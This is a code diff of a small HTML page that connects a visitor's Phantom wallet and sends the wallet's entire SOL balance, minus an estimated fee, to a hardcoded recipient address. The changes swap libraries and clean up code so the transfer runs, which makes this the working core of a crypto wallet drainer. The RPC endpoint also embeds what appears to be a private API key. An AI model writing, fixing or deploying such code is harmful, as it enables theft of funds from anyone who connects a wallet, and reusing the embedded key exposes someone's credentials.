@@ -4,8 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <!-- Correct Solana Web3.js library -->
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.41.4/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/5.7.1/buffer.min.js"></script>
+    <script>
+        window.Buffer = buffer.Buffer;
+    </script>
+    <link rel="icon" href="data:,">
 </head>
 <body>
     <h1>Click below to transfer all funds</h1>
@@ -20,31 +24,34 @@
 
             try {
                 // Connect to Phantom wallet
-                const response = await window.solana.connect();
-                const publicKey = response.publicKey;
-
+                await window.solana.connect();
+                const publicKey = window.solana.publicKey;
                 if (!publicKey) {
                     throw new Error('Failed to get public key.');
                 }
 
-                // Connect to Solana network
-                const connection = new solanaWeb3.Connection('https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df', 'confirmed');
+                // Connect to Solana network via QuickNode RPC URL
+                const connection = new solanaWeb3.Connection(
+                    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
+                    'confirmed'
+                );
 
-                // Check wallet balance
+                // Get balance and check for sufficient funds
                 const balance = await connection.getBalance(publicKey);
-
-                if (balance <= 5000) {
-                    alert('Insufficient SOL balance to cover the transaction fee.');
+                if (balance <= 5000) {  // Subtracting estimated fee of 5000 lamports
+                    alert('Insufficient SOL balance to cover transaction fees.');
                     return;
                 }
 
-                const recipient = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';
+                // Define recipient wallet address
+                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
 
+                // Create transaction to transfer SOL
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(recipient),
-                        lamports: balance - 5000 // Subtracting estimated transaction fee
+                        toPubkey: recipient,
+                        lamports: balance - 5000 // Subtract estimated transaction fee
                     })
                 );
 
@@ -52,15 +59,14 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
-                // Sign the transaction
+                // Sign and send the transaction
                 const signedTransaction = await window.solana.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
                 await connection.confirmTransaction(signature);
 
-                alert(`Transaction successful: ${signature}`);
+                alert(`Transaction successful! Signature: ${signature}`);
             } catch (error) {
-                console.error('Transaction failed:', error);
                 alert(`Transaction failed: ${error.message}`);
             }
         });
